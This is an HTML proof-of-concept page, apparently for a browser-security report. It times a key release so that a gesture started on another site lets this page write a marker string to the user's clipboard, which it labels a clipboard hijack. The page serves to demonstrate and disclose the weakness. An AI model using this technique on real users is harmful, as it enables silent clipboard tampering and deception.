<!DOCTYPE html>
<html>

<head>
    <title>PoC - Site B</title>
    <style>
        body {
            font-family: monospace;
            background: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        #timer {
            font-size: 3rem;
            font-weight: bold;
        }

        #status {
            margin-top: 20px;
            color: #666;
        }
    </style>
</head>

<body>

    <div id="timer">2s...</div>
    <div id="status">Tahan terus sampai 1s</div>

    <script>
        setTimeout(() => { document.getElementById('timer').innerText = "1s..."; }, 1000);
        setTimeout(() => { document.getElementById('timer').innerText = "LEPAS!"; }, 2000);

        window.addEventListener('keyup', async (e) => {
            if (e.key === 'Enter') {
                const status = document.getElementById('status');

                if (navigator.userActivation.isActive) {
                    try {
                        await navigator.clipboard.writeText("HACKED_GHOST_GESTURE");
                        status.innerText = "RESULT: SUCCESS (Clipboard Hijacked)";
                        status.style.color = "black";
                    } catch (err) {
                        status.innerText = "RESULT: FAILED (Permission Denied)";
                    }
                } else {
                    status.innerText = "RESULT: EXPIRED (Too late)";
                }
            }
        });
    </script>
</body>

</html>
